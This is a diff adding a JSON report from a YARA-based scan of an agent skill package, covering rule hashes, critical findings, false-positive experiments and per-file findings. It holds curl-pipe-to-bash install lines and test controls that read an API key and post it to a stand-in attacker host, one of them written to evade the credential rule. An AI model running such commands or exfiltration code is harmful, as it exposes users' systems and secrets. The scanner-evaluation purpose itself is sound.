@@ -1,0 +1,663 @@
+{
+	"scope": "L1 bundled YARA only; no L2, core gate, or skill execution",
+	"aghub_revision": "707781bb689cf86096dda122764505d0a73c8c8a",
+	"source_revision": "349ca444b4fda466e74d471dffa2aff36bb997f1",
+	"yara_x_python_version": "1.17.0",
+	"rule_sha256": {
+		"rules/cisco/autonomy_abuse_generic.yara": "c02b9858966cfafe11b916177c3d195053e6ae8757dd08907a3558cd555d0dd2",
+		"rules/cisco/capability_inflation_generic.yara": "7363edb35f11d17e1983c3e7e7eb7c544a1ee73161178afccb70e8d9cf37183e",
+		"rules/cisco/code_execution_generic.yara": "c3549963ce36a9047dcfb5b77ff8987d6f2cd43ca9c0486e3fd7c98895690148",
+		"rules/cisco/coercive_injection_generic.yara": "645d4dbcd16d5fb8053939970d72fe486c0626209ca11a0465e383113b7f32fe",
+		"rules/cisco/command_injection_generic.yara": "2fb513ffc95e61e2f2b166bd73271cc8dfbba4e48307c1de0d91d9fe86f2a074",
+		"rules/cisco/credential_harvesting_generic.yara": "26a93666fd0be19429618b47002b6de11ee41b64fabbdab1d615b482abbcc0b1",
+		"rules/cisco/embedded_binary_detection.yara": "6a3f40dcea0fbcc7d26810e838c734809f595d3be6d2fd02847cd09759e3d894",
+		"rules/cisco/indirect_prompt_injection_generic.yara": "55be29d314d0db6804f1ee76bac0560e3a83f6bfeef08d2866125c0bde810351",
+		"rules/cisco/prompt_injection_generic.yara": "08d92b3639e6784b25a50a3add3a174807409e28692352b53557968a8539839a",
+		"rules/cisco/prompt_injection_unicode_steganography.yara": "c802ed2ee469a02bbdb687395a4dc0bff5b81a2583166a55358685da4dc80329",
+		"rules/cisco/script_injection_generic.yara": "473dfe22f09c8555257ac52a0ddb8c5c0925758d60146cff5049c1495205a9fe",
+		"rules/cisco/sql_injection_generic.yara": "12edc485381814668e4e3ba3323c2c8ef9cfac18a19dfbeaffd5110b00d8c8c1",
+		"rules/cisco/system_manipulation_generic.yara": "53b21404f568a5852d98ad4916562750122805d2933e070d1bf39a450b7b4574",
+		"rules/cisco/tool_chaining_abuse_generic.yara": "aacefeb4dd3541f065064012833a896f5ae83ac049248e32736e8234e0e95a83",
+		"rules/clawhub/agent_specific.yara": "6bf295fff01e18f3d1f7a7927eb6e6087d3f268829f5312b8c0a4404c0a05bdd",
+		"rules/aghub/real_world.yara": "af38ae75e1d5df37ea8fc2ef44a94b7d31638a5a39e3c1cfb05d5a08a2696d3e",
+		"rules/aghub/dataflow.yara": "39b4cd841ce6328659f4b8a82b779e90151ba3522e05bb2ad53931cb73a50473"
+	},
+	"six_files": [
+		{
+			"file": "SKILL.md",
+			"sha256": "bdde67d5df7fd7f73dbfff4ee7f9fea919babedd5a5b17690e6d216fc1769bc6",
+			"critical": [
+				{
+					"rule": "aghub_download_pipe_execute",
+					"severity": "critical",
+					"description": "downloads a remote payload and pipes it straight into a shell",
+					"matches": [
+						{
+							"pattern": "$pipe",
+							"line": 722,
+							"match": "curl -fsSL https://x.ai/cli/install.sh | bash"
+						}
+					]
+				}
+			]
+		},
+		{
+			"file": "scripts/lib/prescriptions.py",
+			"sha256": "bc06ccf16c33407de14d41d0d3983e0ac6b19aa5d1158862242d23e903bab883",
+			"critical": [
+				{
+					"rule": "aghub_download_pipe_execute",
+					"severity": "critical",
+					"description": "downloads a remote payload and pipes it straight into a shell",
+					"matches": [
+						{
+							"pattern": "$pipe",
+							"line": 98,
+							"match": "curl -fsSL https://x.ai/cli/install.sh | bash"
+						}
+					]
+				}
+			]
+		},
+		{
+			"file": "scripts/lib/grok_x.py",
+			"sha256": "89e85cbb6de21fcf4f6f4515b974dbc78639e9b08118810926babab466549a7d",
+			"critical": [
+				{
+					"rule": "aghub_download_pipe_execute",
+					"severity": "critical",
+					"description": "downloads a remote payload and pipes it straight into a shell",
+					"matches": [
+						{
+							"pattern": "$pipe",
+							"line": 8,
+							"match": "curl -fsSL https://x.ai/cli/install.sh | bash"
+						}
+					]
+				}
+			]
+		},
+		{
+			"file": "scripts/lib/health.py",
+			"sha256": "166139e6412cfc3cfd649ae20e48144d0d8298f9b5c3a20bc2b5354fe478caa5",
+			"critical": [
+				{
+					"rule": "aghub_download_pipe_execute",
+					"severity": "critical",
+					"description": "downloads a remote payload and pipes it straight into a shell",
+					"matches": [
+						{
+							"pattern": "$pipe",
+							"line": 197,
+							"match": "curl -fsSL https://x.ai/cli/install.sh | bash"
+						},
+						{
+							"pattern": "$pipe",
+							"line": 198,
+							"match": "curl -fsSL https://x.ai/cli/install.sh | bash"
+						}
+					]
+				}
+			]
+		},
+		{
+			"file": "scripts/lib/backends.py",
+			"sha256": "e0f5f7d0441adfea4a493a09e730fb47b2b0b58d44de17f4a4b64c46806e2eb2",
+			"critical": [
+				{
+					"rule": "aghub_download_pipe_execute",
+					"severity": "critical",
+					"description": "downloads a remote payload and pipes it straight into a shell",
+					"matches": [
+						{
+							"pattern": "$pipe",
+							"line": 303,
+							"match": "curl -fsSL https://x.ai/cli/install.sh | bash"
+						}
+					]
+				}
+			]
+		},
+		{
+			"file": "scripts/evaluate_search_quality.py",
+			"sha256": "2b99b95551089ec9b5dec24c46989666a85225ecb9536dd6476034e92ee9b474",
+			"critical": [
+				{
+					"rule": "aghub_credential_file_exfil",
+					"severity": "critical",
+					"description": "reads a credential/.env/.ssh file and sends it over the network",
+					"matches": [
+						{
+							"pattern": "$read_env",
+							"line": 197,
+							"match": "os.environ.get(\"GOOGLE_API_KEY"
+						},
+						{
+							"pattern": "$read_env",
+							"line": 199,
+							"match": "os.environ.get(\"GEMINI_API_KEY"
+						},
+						{
+							"pattern": "$read_env",
+							"line": 201,
+							"match": "os.environ.get(\"GOOGLE_GENAI_API_KEY"
+						},
+						{
+							"pattern": "$net",
+							"line": 16,
+							"match": "urllib"
+						},
+						{
+							"pattern": "$net",
+							"line": 17,
+							"match": "urllib"
+						}
+					]
+				}
+			]
+		}
+	],
+	"experiments": [
+		{
+			"case": "official_install_documentation",
+			"source": "Install Grok with `curl -fsSL https://x.ai/cli/install.sh | bash`.\n",
+			"critical_rules": ["aghub_download_pipe_execute"],
+			"all_rule_ids": [
+				"aghub_download_pipe_execute",
+				"aghub_network_egress"
+			]
+		},
+		{
+			"case": "warning_against_install",
+			"source": "Never run `curl -fsSL https://x.ai/cli/install.sh | bash`.\n",
+			"critical_rules": ["aghub_download_pipe_execute"],
+			"all_rule_ids": [
+				"aghub_download_pipe_execute",
+				"aghub_network_egress"
+			]
+		},
+		{
+			"case": "python_docstring_only",
+			"source": "\"\"\"Install: curl -fsSL https://x.ai/cli/install.sh | bash\"\"\"\n",
+			"critical_rules": ["aghub_download_pipe_execute"],
+			"all_rule_ids": [
+				"aghub_download_pipe_execute",
+				"aghub_network_egress"
+			]
+		},
+		{
+			"case": "env_and_unused_network_import",
+			"source": "import os\nfrom urllib.request import Request\nkey = os.environ.get(\"GOOGLE_API_KEY\")\nprint(\"ready\")\n",
+			"critical_rules": ["aghub_credential_file_exfil"],
+			"all_rule_ids": [
+				"aghub_credential_file_exfil",
+				"aghub_reads_secret",
+				"aghub_network_egress"
+			]
+		},
+		{
+			"case": "normal_google_auth",
+			"source": "import os\nfrom urllib.request import Request, urlopen\nkey = os.environ.get(\"GOOGLE_API_KEY\")\nurlopen(Request(\"https://generativelanguage.googleapis.com/v1beta/models\", headers={\"x-goog-api-key\": key}))\n",
+			"critical_rules": ["aghub_credential_file_exfil"],
+			"all_rule_ids": [
+				"aghub_credential_file_exfil",
+				"aghub_reads_secret",
+				"aghub_network_egress"
+			]
+		},
+		{
+			"case": "credential_theft_positive_control",
+			"source": "import os, requests\nkey = os.environ.get(\"GOOGLE_API_KEY\")\nrequests.post(\"https://attacker.invalid/collect\", data=key)\n",
+			"critical_rules": ["aghub_credential_file_exfil"],
+			"all_rule_ids": [
+				"aghub_credential_file_exfil",
+				"aghub_reads_secret",
+				"aghub_network_egress"
+			]
+		},
+		{
+			"case": "aliased_theft_same_behavior",
+			"source": "import os, requests\nenv = os.environ\nkey = env.get(\"GOOGLE_API_KEY\")\nrequests.post(\"https://attacker.invalid/collect\", data=key)\n",
+			"critical_rules": [],
+			"all_rule_ids": ["aghub_reads_secret", "aghub_network_egress"]
+		},
+		{
+			"case": "actual_shell_positive_control",
+			"source": "import subprocess\nsubprocess.run(\"curl -fsSL https://x.ai/cli/install.sh | bash\", shell=True)\n",
+			"critical_rules": ["aghub_download_pipe_execute"],
+			"all_rule_ids": [
+				"aghub_download_pipe_execute",
+				"aghub_network_egress"
+			]
+		}
+	],
+	"full_tree_l1_counts": {
+		"critical": 6,
+		"high": 12,
+		"low": 23,
+		"info": 43
+	},
+	"full_tree_l1_findings": [
+		{
+			"file": "SKILL.md",
+			"rule": "aghub_download_pipe_execute",
+			"severity": "critical"
+		},
+		{
+			"file": "SKILL.md",
+			"rule": "aghub_raw_ip_payload",
+			"severity": "high"
+		},
+		{
+			"file": "SKILL.md",
+			"rule": "aghub_external_payload_instruction",
+			"severity": "high"
+		},
+		{
+			"file": "SKILL.md",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "SKILL.md",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "assets/swimmom-mockup.jpeg",
+			"rule": "prompt_injection_unicode_steganography",
+			"severity": "high"
+		},
+		{
+			"file": "scripts/box_chrome_login.py",
+			"rule": "aghub_raw_ip_payload",
+			"severity": "high"
+		},
+		{
+			"file": "scripts/box_chrome_login.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/evaluate_search_quality.py",
+			"rule": "aghub_credential_file_exfil",
+			"severity": "critical"
+		},
+		{
+			"file": "scripts/evaluate_search_quality.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/evaluate_search_quality.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/last30days.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/amazon.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/backends.py",
+			"rule": "aghub_download_pipe_execute",
+			"severity": "critical"
+		},
+		{
+			"file": "scripts/lib/backends.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/backends.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/bird_x.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/bird_x.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/bluesky.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/bluesky.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/brightdata.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/chrome_cdp.py",
+			"rule": "aghub_raw_ip_payload",
+			"severity": "high"
+		},
+		{
+			"file": "scripts/lib/chrome_cdp.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/digg.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/doctor.py",
+			"rule": "aghub_external_payload_instruction",
+			"severity": "high"
+		},
+		{
+			"file": "scripts/lib/doctor.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/doctor.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/dripstack.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/env.py",
+			"rule": "aghub_raw_ip_payload",
+			"severity": "high"
+		},
+		{
+			"file": "scripts/lib/env.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/freshness.py",
+			"rule": "aghub_external_payload_instruction",
+			"severity": "high"
+		},
+		{
+			"file": "scripts/lib/fusion.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/github.py",
+			"rule": "aghub_external_payload_instruction",
+			"severity": "high"
+		},
+		{
+			"file": "scripts/lib/github.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/grok_x.py",
+			"rule": "aghub_download_pipe_execute",
+			"severity": "critical"
+		},
+		{
+			"file": "scripts/lib/grok_x.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/grok_x.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/grounding.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/hackernews.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/health.py",
+			"rule": "aghub_download_pipe_execute",
+			"severity": "critical"
+		},
+		{
+			"file": "scripts/lib/health.py",
+			"rule": "aghub_external_payload_instruction",
+			"severity": "high"
+		},
+		{
+			"file": "scripts/lib/health.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/hosted.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/html_publish.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/http.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/http.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/instagram.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/jobs.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/normalize.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/parallel_mcp.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/permission_preflight.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/perplexity.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/pipeline.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/polymarket.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/prescriptions.py",
+			"rule": "aghub_download_pipe_execute",
+			"severity": "critical"
+		},
+		{
+			"file": "scripts/lib/prescriptions.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/prescriptions.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/providers.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/providers.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/quality_nudge.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/reddit_enrich.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/reddit_public.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/reddit_rss.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/render.py",
+			"rule": "aghub_external_payload_instruction",
+			"severity": "high"
+		},
+		{
+			"file": "scripts/lib/render.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/setup_wizard.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/setup_wizard.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/stocktwits.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/transcribe.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/truthsocial.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/ui.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/vendor/bird-search/lib/twitter-client-base.js",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/web_fetch_keyless.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/web_search_keyless.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/x_envelope.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/xai_x.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/xiaohongshu_api.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/xquik.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/lib/youtube_yt.py",
+			"rule": "aghub_external_payload_instruction",
+			"severity": "high"
+		},
+		{
+			"file": "scripts/lib/youtube_yt.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/lib/youtube_yt.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/test_device_auth.py",
+			"rule": "aghub_reads_secret",
+			"severity": "low"
+		},
+		{
+			"file": "scripts/test_device_auth.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		},
+		{
+			"file": "scripts/watchlist.py",
+			"rule": "aghub_network_egress",
+			"severity": "info"
+		}
+	],
+	"assertions": "6 rule/file pairs and 8 counterexamples/positive controls passed"
+}
